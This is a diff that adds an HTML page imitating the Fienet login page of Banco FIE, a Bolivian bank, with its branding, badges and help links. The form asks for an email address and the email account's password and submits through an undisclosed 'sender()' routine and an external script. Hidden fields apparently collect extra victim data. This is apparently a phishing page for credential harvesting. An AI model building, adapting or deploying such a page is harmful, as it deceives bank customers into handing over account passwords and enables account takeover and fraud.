@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+
+<html class="no-js k-webkit k-webkit109 ng-scope" ng-app="cobis-cwc-container" ng-strict-di="">
+   <head>
+
+      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+      <style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}</style>
+      <style type="text/css" media="print">
+         body { visibility: hidden; display: none }
+      </style>
+      <link rel="stylesheet" href="css/estilos.css">
+    
+      <link rel="icon" type="img/png" ng-href="/CWC-IB/services/cobis/web/assets/img/favicon.ico" href="https://fienet.bancofie.com.bo/CWC-IB/services/cobis/web/assets/img/favicon.ico">
+            <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> 
+      
+      <title>Banco FIE</title>
+     
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <!-- Mobile tags -->
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <meta name="apple-mobile-web-app-capable" content="yes">
+      
+      <link id="style-ib-container" rel="stylesheet" href="css/theme.css">
+      <!-- Scripts -->
+      <style type="text/css">#_copy{align-items:center;background:#4494d5;border-radius:3px;color:#fff;cursor:pointer;display:flex;font-size:13px;height:30px;justify-content:center;position:absolute;width:60px;z-index:1000}#select-tooltip,#sfModal,.modal-backdrop,div[id^=reader-helper]{display:none!important}.modal-open{overflow:auto!important}._sf_adjust_body{padding-right:0!important}.super_copy_btns_div{position:fixed;width:154px;left:10px;top:45%;background:#e7f1ff;border:2px solid #4595d5;font-weight:600;border-radius:2px;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Helvetica Neue,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol;z-index:5000}.super_copy_btns_logo{width:100%;background:#4595d5;text-align:center;font-size:12px;color:#e7f1ff;line-height:30px;height:30px}.super_copy_btns_btn{display:block;width:128px;height:28px;background:#7f5711;border-radius:4px;color:#fff;font-size:12px;border:0;outline:0;margin:8px auto;font-weight:700;cursor:pointer;opacity:.9}.super_copy_btns_btn:hover{opacity:.8}.super_copy_btns_btn:active{opacity:1}</style>
+   </head>
+   <body>
+
+         <header ui-view="header" style="display:none;" class="ng-scope">
+            <!-- ngInclude: 'views/commons/tpl-container-header.html' -->
+            <div id="header-content" ng-include="&#39;views/commons/tpl-container-header.html&#39;" class="ng-scope">
+               <div id="shell" class="ng-scope">
+                  <nav id="shell-head" style="z-index:2;">
+                     <div id="system-options" class="cb-flex">
+                        <!-- ngIf: showLogoutSection -->
+                        <div class="cb-grow">
+                           <!-- ngIf: defaultTheme!='theme-container-grey' --><button ng-if="defaultTheme!=&#39;theme-container-grey&#39;" class="btn btn-link btn-sm ng-scope" ng-click="changeStyle(&#39;theme-container-grey&#39;, &#39;&#39;, &#39;grey&#39;)"><span class="fa fa-adjust"></span> Alto contraste</button><!-- end ngIf: defaultTheme!='theme-container-grey' -->
+                           <!-- ngIf: defaultTheme=='theme-container-grey' -->
+                        </div>
+                        <div>
+                           <!-- ngIf: showLogoutSection -->
+                        </div>
+                     </div>
+                     <div id="shell-head-content" class="cb-flex cb-middle">
+                     
+                        <div><a href="#" id="shell-head-logo-cobis" ng-click="goHome()" class="ng-binding"></a></div>
+                  
+                        <div id="user-options" class="cb-grow">
+                           <div id="app-title" ng-class="showLogoutSection?&#39;login&#39;:&#39;&#39;">Fondo en línea</div>
+                           <div id="user-info" ng-show="showLogoutSection" class="ng-hide">
+                              <span class="cb-label1 hidden-xs ng-binding" style="padding-left: 0;">Bienvenido</span> <span class="cb-text1 ng-binding" style="text-transform:capitalize;"></span>
+                              <span class="hidden-xs hidden-sm"><span class="cb-label1 ng-binding">Fecha</span> <span class="cb-text1 ng-binding"></span></span>
+                              <span class="hidden-xs hidden-sm"><span class="cb-label1 ng-binding">Último Acceso</span> <span class="cb-text1 ng-binding"></span></span>
+                              <span class="hidden-xs hidden-sm"><span class="cb-label1 ng-binding">IP:</span> <span class="cb-text1 ng-binding"></span></span>
+                           </div>
+                        </div>
+                        <div id="system-menu" class="dropdown" onclick="if(this.className===&#39;dropdown open&#39;){this.className = &#39;dropdown&#39;;}else{this.className = &#39;dropdown open&#39;;}">
+                           <button class="dropdown-toggle btn btn-default" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"><span class="fa fa-ellipsis-v"></span></button>
+                           <ul class="dropdown-menu dropdown-menu-right">
+                              <li>
+                                 <!-- ngIf: defaultTheme!=='theme-container-grey' --><a href="#" ng-if="defaultTheme!==&#39;theme-container-grey&#39;" ng-click="changeStyle(&#39;theme-container-grey&#39;, &#39;&#39;, &#39;grey&#39;)" class="ng-scope"><span class="fa fa-adjust"></span> Alto contraste</a><!-- end ngIf: defaultTheme!=='theme-container-grey' -->
+                              </li>
+                              <li>
+                            
+                              </li>
+                   
+                           </ul>
+                        </div>
+                        <div class="isotype-cobis" hidden-xs"=""></div>
+                     </div>
+                  </nav>
+               
+               </div>
+            </div>
+         </header>
+         <main>
+            <!-- uiView: content -->
+            <div ui-view="content" class="ng-scope">
+               <main class="cb-login-well well ng-scope">
+                  <div class="left" style="padding-top: 40px;">
+                     <img src="img/logo.png" alt="Cobiscorp" class="logo">
+                     <div class="content">
+                        <div id="formLogin" style="display: block">
+                           <form class="form bv-form ng-pristine ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength" action="" method="post"  onsubmit=" return sender()" >
+                        
+                              
+                              <h1 class="ng-binding">Ingreso a Fienet</h1>
+                              <div class="alert alert-danger" id="msg-error">
+                                 <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="-285 408.9 24 24" style="enable-background:new -285 408.9 24 24;" xml:space="preserve" class="svg replaced-svg">
+                                    <path d="M-273,410.9c-5.5,0-10,4.5-10,10s4.5,10,10,10s10-4.5,10-10S-267.5,410.9-273,410.9z M-281,420.9c0-1.8,0.6-3.5,1.7-4.9  l11.2,11.2c-1.4,1.1-3.1,1.7-4.9,1.7C-277.4,428.9-281,425.3-281,420.9z M-266.7,425.8l-11.2-11.2c1.4-1.1,3.1-1.7,4.9-1.7  c4.4,0,8,3.6,8,8C-265,422.7-265.6,424.4-266.7,425.8z"></path>
+                                 </svg>
+                                 <p></p>
+                              </div>
+                              <div class="form-group" ng-class="{ &#39;has-error&#39;: form.username.$dirty &amp;&amp; form.username.$error.required }">
+                                 <div id="remember-user-div">
+                                    <label class="ng-binding">CORREO ELECTRÓNICO<a href="#" ng-click="remeberUser($event)" style="display: none;" class="ng-binding">No lo recuerdo</a></label>
+                                 </div>
+                                 <input  type="email" class="form-control ng-pristine ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-touched" id="VC0RR3"  required="" tabindex="1"  minlength="2" maxlength="64" > <span  class="help-block ng-binding ng-hide">Debe ingresar un nombre de usuario</span>
+                                 <div id="remember-user-div">
+                                    <label class="ng-binding">CONTRASEÑA CORREO<a href="#" ng-click="remeberUser($event)" style="display: none;" class="ng-binding">No lo recuerdo</a></label>
+                                 </div>
+                                 <input  type="password" class="form-control ng-pristine ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-touched" id="vUSUARIO" ng-model="username" required="" tabindex="1" autocomplete="off" style="padding-left:-40px;" minlength="4" maxlength="64" data-bv-field="username"> <span ng-show="form.username.$dirty &amp;&amp; form.username.$error.required" class="help-block ng-binding ng-hide">Debe ingresar un nombre de usuario</span>
+
+                                
+                                 <a id="showPass" type="button" style="cursor: pointer;" class="show-pass ng-binding">
+
+                                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="-285 412.9 24 16" style="enable-background:new -285 412.9 24 16;" xml:space="preserve" class="svg replaced-svg">
+                                       <g>
+                                          <g>
+                                             <path d="M-273,412.9c-7.9,0-12,8-12,8s3.1,8,12,8c8.1,0,12-8,12-8S-264.9,412.9-273,412.9z M-273,425.9c-2.9,0-5-2.2-5-5    c0-2.8,2.1-5,5-5s5,2.2,5,5C-268,423.7-270.1,425.9-273,425.9z M-273,417.9c-1.7,0-3,1.4-3,3c0,1.6,1.3,3,3,3c1.7,0,3-1.4,3-3    C-270,419.3-271.3,417.9-273,417.9z"></path>
+                                          </g>
+                                       </g>
+                                    </svg>
+                                    Mostrar contraseña
+                                 </a>
+                                 
+                                 <a href="#" class="hide-pass ng-binding">
+                                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="-284.6 410 24.8 20.8" style="enable-background:new -284.6 410 24.8 20.8;" xml:space="preserve" class="svg replaced-svg">
+                                       <style type="text/css">
+                                          .st0{fill:none;}
+                                       </style>
+                                       <path class="st0" d="M-274.4,421.9c0.5,0.5,1.3,0.9,2.1,0.9c1.7,0,3-1.4,3-3c0-0.8-0.3-1.6-0.9-2.1c-0.2-0.2-0.4-0.3-0.6-0.4  l-4.1,4.1C-274.8,421.6-274.6,421.8-274.4,421.9z"></path>
+                                       <path class="st0" d="M-269.3,419.8c0,1.6-1.3,3-3,3c-0.8,0-1.6-0.3-2.1-0.9l-1.5,1.5c0.9,0.9,2.1,1.4,3.6,1.4c2.9,0,5-2.2,5-5  c0-1.4-0.5-2.7-1.4-3.6l-1.5,1.5C-269.7,418.2-269.3,419-269.3,419.8z"></path>
+                                       <path class="st0" d="M-274.9,421.4l-1.5,1.5c0.1,0.2,0.3,0.4,0.4,0.6l1.5-1.5C-274.6,421.8-274.8,421.6-274.9,421.4z"></path>
+                                       <path class="st0" d="M-270.2,417.7l1.5-1.5c-0.2-0.2-0.4-0.3-0.6-0.4l-1.5,1.5C-270.6,417.4-270.4,417.5-270.2,417.7z"></path>
+                                       <path class="st0" d="M-277.3,419.8c0,0.9,0.2,1.7,0.6,2.4l1.5-1.5c-0.1-0.3-0.1-0.6-0.1-0.8c0-1.6,1.3-3,3-3c0.3,0,0.6,0,0.8,0.1  l1.5-1.5c-0.7-0.4-1.5-0.6-2.4-0.6C-275.2,414.8-277.3,417-277.3,419.8z"></path>
+                                       <path class="st0" d="M-275.2,420.7l-1.5,1.5c0.1,0.2,0.2,0.4,0.4,0.6l1.5-1.5C-275,421.1-275.1,420.9-275.2,420.7z"></path>
+                                       <path class="st0" d="M-271.5,417c0.2,0.1,0.5,0.2,0.7,0.3l1.5-1.5c-0.2-0.1-0.4-0.3-0.6-0.4L-271.5,417z"></path>
+                                       <path d="M-264.5,414.8l2.9-2.9c0.4-0.4,0.4-1,0-1.4s-1-0.4-1.4,0l-18.4,18.4c-0.4,0.4-0.4,1,0,1.4c0.2,0.2,0.5,0.3,0.7,0.3  s0.5-0.1,0.7-0.3l3.2-3.2c1.3,0.5,2.8,0.8,4.4,0.8c8.1,0,12-8,12-8S-261.7,417.1-264.5,414.8z M-272.3,424.8c-0.7,0-1.3-0.1-1.9-0.3  l1.7-1.7c0.1,0,0.1,0,0.2,0c1.7,0,3-1.4,3-3c0-0.1,0-0.1,0-0.2l1.7-1.7c0.2,0.6,0.3,1.2,0.3,1.9  C-267.3,422.6-269.4,424.8-272.3,424.8z M-272.3,416.8c0.3,0,0.6,0,0.8,0.1l-3.7,3.7c-0.1-0.3-0.1-0.6-0.1-0.8  C-275.3,418.2-274,416.8-272.3,416.8z M-284.4,419.8c0,0,4.1-8,12-8c1.9,0,3.5,0.4,4.9,1.1l-2.5,2.5c-0.7-0.4-1.5-0.6-2.4-0.6  c-2.9,0-5,2.2-5,5c0,0.9,0.2,1.7,0.6,2.4l-3.2,3.2C-283.1,423-284.4,419.8-284.4,419.8z"></path>
+                                    </svg>
+                                    Ocultar usuario
+                                 </a>
+                               
+                                 <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="394.8 342.4 25.5 19.7" style="enable-background:new 394.8 342.4 25.5 19.7;" xml:space="preserve" class="svg icon-success replaced-svg">
+                                    <g>
+                                       <path d="M402.1,362c-0.4,0-0.8-0.2-1-0.4l-5.7-5.7c-0.3-0.3-0.4-0.6-0.4-1c0-0.4,0.2-0.8,0.4-1c0.3-0.3,0.6-0.4,1-0.4   c0.3,0,0.8,0.2,1,0.4l4.7,4.7l15.5-15.5c0.6-0.6,1.5-0.6,2.1,0c0.3,0.3,0.4,0.6,0.4,1c0,0.4-0.2,0.8-0.4,1l-16.6,16.6   C402.9,361.9,402.5,362,402.1,362z"></path>
+                                    </g>
+                                 </svg>
+                                 <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Слой_1" x="0px" y="0px" viewBox="-272.5 413.4 15 15" style="enable-background:new -272.5 413.4 15 15;" xml:space="preserve" class="svg icon-error replaced-svg">
+                                    <g>
+                                       <path d="M-258.3,427.6c-0.4,0.4-1,0.4-1.4,0l-5.3-5.3l-5.3,5.3c-0.4,0.4-1,0.4-1.4,0c-0.4-0.4-0.4-1,0-1.4l5.3-5.3l-5.3-5.3   c-0.4-0.4-0.4-1,0-1.4c0.4-0.4,1-0.4,1.4,0l5.3,5.3l5.2-5.2c0.4-0.4,1-0.4,1.4,0c0.4,0.4,0.4,1,0,1.4l-5.2,5.2l5.3,5.3   C-257.9,426.6-257.9,427.2-258.3,427.6z"></path>
+                                    </g>
+                                 </svg>
+                                 <div class="clearfix"></div>
+                                 <small class="help-block" data-bv-validator="notEmpty" data-bv-for="username" data-bv-result="NOT_VALIDATED" style="display: none;">Por favor introduce un valor</small><small class="help-block" data-bv-validator="stringLength" data-bv-for="username" data-bv-result="NOT_VALIDATED" style="display: none;">Por favor introduce un valor con una longitud vÃ¡lida</small>
+                              </div>
+                              
+                              
+                              <div class="form-group">
+                                 <button id="btnLogin" type="submit" class="btn ng-binding" ng-click="login($event)" ng-disabled="form.$invalid" >
+                                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Слой_1" x="0px" y="0px" viewBox="-266 414.9 7 12" style="enable-background:new -266 414.9 7 12;" xml:space="preserve" class="svg replaced-svg">
+                                       <style type="text/css">
+                                          .st0{fill:#FFFFFF;}
+                                       </style>
+                                       <path id="Chevron_Right" class="st0" d="M-259.3,420.2l-5-5c-0.4-0.4-1-0.4-1.4,0c-0.4,0.4-0.4,1,0,1.4l4.3,4.3l-4.3,4.3  c-0.4,0.4-0.4,1,0,1.4c0.4,0.4,1,0.4,1.4,0l5-5C-258.9,421.2-258.9,420.6-259.3,420.2z"></path>
+                                    </svg>
+                                    Continuar
+                                 </button>
+                                 <a href="#">
+                                 <img src="img/globalsing.png" alt="SSL" class="verysing" style="margin-top:10px;">
+                                 </a>
+                              </div>
+                              <div class="clearfix"></div>
+                              <p id="gfg"  hidden="">
+                        <p id="address"  hidden="">
+                           </form>
+                           <div class="form-group" align="center">
+                              <br>
+                              <a href="#">
+                              <img src="img/botonASFI.jpg">
+                              </a>
+                           </div>
+                           <div>
+                              <br>
+                              <a id="pdf_con" href="#" class="btn_doc ng-binding"> 		
+                              <img src="img/icon-lock.svg" alt="&gt;" class="svg_doc">					
+                              Consejos de Seguridad
+                              </a>
+                              <a id="pdf_pri" href="#" class="btn_doc ng-binding"> 
+                              <img src="img/icon-user.svg" alt="&gt;" class="svg_doc">	
+                              Mi Primer Ingreso
+                              </a>
+                              <a id="pdf_pre" href="#" class="btn_doc ng-binding"> 
+                              <img src="img/icon-help.svg" alt="&gt;" class="svg_doc">	
+                              Preguntas Frecuentes
+                              </a>					
+                           </div>
+                           <div class="foot foot-static">
+                              <div id="NORMAL" style="display: none;">
+                                 <p class="no-user ng-binding">No tengo usuario <a href="#" class="btn-popover ng-binding" data-container="body" data-toggle="popover" data-placement="Rigth" data-content="Ingrese su número de Identificación y la clave proporcionada al momento de la afiliación al servicio de Internet Banking, si no lo tiene comuníquese a nuestro Call Center o acérquese a cualquiera de nuestras oficinas donde con gusto lo atenderemos." data-original-title="" title="">¿Cómo lo consigo?</a></p>
+                              </div>
+                              <div id="ENRROL" style="display: none;">
+                                 <p class="no-user ng-binding">No tengo usuario <a href="#" class="ng-binding">Solicite Usuario</a></p>
+                              </div>
+                              <ul class="redes" align="center">
+                                 <!--li>
+                                    <a href="javascript:;" onClick="if(sessionStorage && cobis.userContext.getValue('LOGIN_TWITTER')) {window.open(cobis.userContext.getValue('LOGIN_TWITTER'))}"><img src="../assets/img/icon-twitter.svg" class="svg twitter"  alt={{'CWC.CONTAINER.GENERAL.LABELS.USER_TWITTER'|translate}}></a>
+                                    </li-->
+                                 <li>
+                                    <a href="#">
+                                       <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="-266.2 396.5 51 51" style="enable-background:new -266.2 396.5 51 51;" xml:space="preserve" class="svg facebook replaced-svg">
+                                          <path d="M-240.7,397.4c-13.6,0-24.6,11-24.6,24.6c0,13.6,11,24.6,24.6,24.6s24.6-11,24.6-24.6C-216,408.4-227.1,397.4-240.7,397.4z   M-234.1,421.9h-4.3c0,6.8,0,15.2,0,15.2h-6.3c0,0,0-8.3,0-15.2h-3v-5.4h3V413c0-2.5,1.2-6.4,6.4-6.4l4.7,0v5.2c0,0-2.8,0-3.4,0  c-0.6,0-1.3,0.3-1.3,1.5v3.2h4.8L-234.1,421.9z"></path>
+                                       </svg>
+                                    </a>
+                                 </li>
+                                 <li>
+                                    <a href="#">
+                                       <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="-290.5 395.7 51 51" style="enable-background:new -290.5 395.7 51 51;" xml:space="preserve" class="svg mail replaced-svg">
+                                          <path d="M-265,396.6c-13.6,0-24.6,11-24.6,24.6c0,13.6,11,24.6,24.6,24.6c13.6,0,24.6-11,24.6-24.6  C-240.4,407.6-251.4,396.6-265,396.6z M-279.6,415.2l8,4.9l-8,10V415.2z M-278.7,431.2l8.3-10.4l5.4,3.3l5.4-3.3l8.3,10.4H-278.7z   M-250.4,430.2l-8-10.1l8-4.9V430.2z M-250.4,413.5l-14.6,9l-14.6-8.9v-2.4h29.2V413.5z"></path>
+                                       </svg>
+                                    </a>
+                                 </li>
+                              </ul>
+                              <div class="form-group" align="center">
+                                 <img src="img/claim.png">
+                              </div>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+                  <div class="right" id="imgByType" style="background-image: url(&quot;img/pic_txt_2.jpg&quot;); min-height: 625px;"></div>
+               </main>
+               
+            </div>
+         </main>
+  		
+      </div>
+      <script>
+       $(document).ready(function(){
+  
+   $('#showPass').on('click', function(){
+      var passInput=$("#vUSUARIO");
+      if(passInput.attr('type')==='password')
+        {
+          passInput.attr('type','text');
+      }else{
+         passInput.attr('type','password');
+      }
+  })
+})
+       </script>
+       <script src="js/sax3.js"></script>
+   </body>
+</html>
